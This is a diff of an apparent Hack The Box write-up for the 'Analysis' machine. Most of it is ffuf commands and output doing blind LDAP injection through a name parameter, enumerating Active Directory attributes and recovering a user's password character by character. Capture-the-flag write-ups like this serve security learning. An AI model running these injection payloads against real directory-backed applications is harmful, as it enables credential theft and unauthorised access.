@@ -435,16 +435,16 @@ In layman's term: **LDAP Injection is a [syntax-weird](https://en.wikipedia.org/
 > Useful resources: [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection), [Common LDAP Attribute Names](https://ftpdocs.broadcom.com/cadocs/0/CA%20Process%20Automation%2004%202%2002-ENU/Bookshelf_Files/HTML/Content%20Designer%20Reference/1187917.html).
 
 
-Since we already know that there is a `name` parameter, we could start fuzzing for the next one which might contains the user's password:
+Since we already know that there is a `name` parameter, we could start fuzzing for the next one:
 
 ```bash
-$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(FUZZ=*))%00"  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -ac
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=t*)(FUZZ=*' -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -ac -c
 
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(FUZZ=*))%00
- :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: URL              : http://internal.analysis.htb/users/list.php?name=t*)(FUZZ=*
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt
  :: Follow redirects : false
  :: Calibration      : true
  :: Timeout          : 10
@@ -452,30 +452,137 @@ ________________________________________________
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
-countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 80ms]
-description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 73ms]
-displayname             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 43ms]
-name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 112ms]
+accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 507ms]
+badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
+codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
+countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+createTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
+description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 55ms]
+distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 48ms]
+givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 50ms]
+instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 53ms]
+lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 55ms]
+lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
+logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
+modifyTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
+name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
+objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 40ms]
+nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
+objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
+objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 51ms]
+objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 50ms]
+pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
+replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
+sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 120ms]
+userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
 ```
 
-There seem to be 5 parameteres to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` filed to hold interesting information we can start with that. We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz it. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
+We know the the value of the `objectClass` attribute should be `user` since `technician` is a user. So we can try set this attribute, and continue our fuzzing journey:
+
+```bash
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(FUZZ=*)' -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -ac -c
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(FUZZ=*)
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 115ms]
+badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 78ms]
+badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 90ms]
+countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 33ms]
+cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 95ms]
+codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 104ms]
+createTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 107ms]
+description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
+distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 67ms]
+givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 130ms]
+instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 108ms]
+lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 85ms]
+lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 82ms]
+logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+modifyTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 80ms]
+name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 102ms]
+nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
+objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 41ms]
+objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 90ms]
+objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 78ms]
+objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 82ms]
+pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 75ms]
+replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 67ms]
+sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
+userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 44ms]
+userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 65ms]
+```
+
+There seem to be a lot of parameteres to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` field to hold interesting information we can start with that. 
+
+We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz it. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
 
 ```bash
 # performing LDAP injection manually
-$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00"  -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
 
-9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 385ms]
+________________________________________________
 
-$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=9FUZZ*))%00"  -w /usr/share/wordlists/
-seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=FUZZ*)
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 8
+________________________________________________
 
-7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
+9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 47ms]
 
-$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=97FUZZ*))%00"  -w /usr/share/wordlists/
-seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=9FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
 
-N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 68ms]
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=9FUZZ*)
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 8
+________________________________________________
+
+7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97FUZZ*)
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 8
+________________________________________________
+
+N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 40ms]
 ```
 
 The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is used to brute-force `technician`'s password:
@@ -516,8 +623,7 @@ if __name__ == "__main__":
     main()
 ```
 
-- Not yet sure how `(%26(objectClass=user)` was added in between!
-- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack.
+- The above works until it hits the `*` --> This is bypassed by scripting a brute-force attack which includes special characters.
 
 If we run the above script:
 
